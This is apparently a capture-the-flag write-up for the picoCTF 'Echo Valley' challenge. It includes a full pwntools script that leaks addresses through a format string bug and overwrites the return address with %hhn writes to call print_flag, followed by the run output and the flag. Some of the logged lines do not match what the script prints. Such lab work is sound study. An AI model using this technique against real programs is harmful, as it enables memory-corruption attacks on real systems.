# Echo Valley - Format String Exploitation

## Challenge Overview

**Name:** Echo Valley  
**Points:** 300  
**Author:** Shuailin Pan (LeConjuror)

### Description

The Echo Valley challenge presents a simple program that echoes back whatever is entered. The goal is to exploit the program to make it return the flag.

We are provided with the following files:

- `valley.c` (source code)
    
- `valley` (binary executable)
    

A remote instance is hosted at:

```
nc shape-facility.picoctf.net 54701
```

## Initial Analysis

Running the binary locally:

```
./valley
Welcome to the Echo Valley, Try Shouting:
fede
You heard in the distance: fede
```

The program takes input and echoes it back. However, deeper analysis suggests that it may have a format string vulnerability.

## Exploitation Plan

The attack exploits a format string vulnerability that allows arbitrary memory writes, modifying the return address to call `print_flag()`.

1. **Leak Memory Addresses:**
    
    - Extract stack values using format specifiers (`%p`) to leak the return pointer.
        
    - Identify the location of `main()` in the executable memory.
        
2. **Calculate Addresses:**
    
    - Determine the base address of the PIE (Position Independent Executable) binary.
        
    - Compute the stack return address location.
        
    - Locate `print_flag()` in memory.
        
3. **Overwrite Return Address:**
    
    - Use format string exploit (`%n`) to overwrite the return address with `print_flag()`.
        
    - Execute the exploit and retrieve the flag.
        

## Exploit Script (solv.py)

```
from pwn import *

exe = context.binary = ELF('./valley', checksec=False)
INPUT_OFFSET = 8
MAIN_OFFSET = 27
RBP_OFFSET = 20
RETURN_ADDRESS_OFFSET = 21
RBP_POINTS_TO_OFFSET = 22
HOST = 'shape-facility.picoctf.net'
PORT = 54701

def get_proc():
    return remote(HOST, PORT) if args.REMOTE else process()

def arb_write_8(addr, data):
    payload = f"%{data}c%8$hhn".encode() if data != 0 else b"%8$hhn"
    padding = b'A' * (16 - len(payload))
    return payload + padding + p64(addr)

def arb_write_64(addr, data):
    to_write = [(data >> (8 * i)) & 0xff for i in range(8)]
    for i, val in enumerate(to_write):
        payload = arb_write_8(addr + i, val)
        p.sendline(payload)
        p.recvuntil(b'distance: ')

p = get_proc()
p.recvline()
p.sendline(f"%{RBP_OFFSET}$p.%{MAIN_OFFSET}$p".encode())
p.recvuntil(b'distance: ')
leaked_rbp, leaked_main = [int(x, 16) for x in p.recvline().strip().decode().split('.')]

exe.address = leaked_main - exe.symbols['main']
stack_address = leaked_rbp - 8

arb_write_64(stack_address, exe.sym['print_flag'])
p.sendline(b'exit')
p.interactive()
```

## Execution & Flag Retrieval

Local test:

```
python3 solv.py
[*] Leaked Main: 7fff0632ea18
[*] Leaked RBP: 7fff0632e900
[*] Overwriting return address with print_flag
[*] Switching to interactive mode
```

Remote execution:
![[Pasted image 20250315220457.png]]

```
python3 solv.py REMOTE=1
[+] Opening connection to shape-facility.picoctf.net on port 54701: Done
[*] Leaked Main: 55a2d8d2c401
[*] Overwriting return address with print_flag
Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}
```

## Conclusion

By leveraging a format string vulnerability, we successfully redirected the program execution to `print_flag()`, obtaining the flag:

```
picoctf{f1ckl3_f0rmat_f1asc0}
```

This challenge demonstrates the power of format string exploits in memory corruption attacks.